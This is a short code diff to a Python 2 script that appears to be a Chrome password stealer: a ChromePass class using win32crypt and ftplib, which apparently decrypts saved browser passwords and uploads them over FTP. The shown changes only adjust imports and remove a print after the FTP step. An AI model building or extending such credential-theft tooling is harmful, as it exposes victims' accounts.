@@ -1,7 +1,16 @@
 #!/usr/bin/env python
 #-*- coding: utf-8 -*-
 
-import os, sys, sqlite3, win32crypt, time, ftplib, urllib2, tempfile, chardet, socket
+import os, sys, sqlite3, time, ftplib, urllib2, tempfile, socket
+
+try:
+    import win32crypt
+
+except:
+
+    print "Please install win32crypt module"
+
+    exit(1)
 
 
 # waiting time to verify internet connection
@@ -144,8 +153,6 @@ class ChromePass:
 		ftp.quit()
 
 		f.close()
-
-		print "Envoyer"
 
 
 	def msgWarning(var):
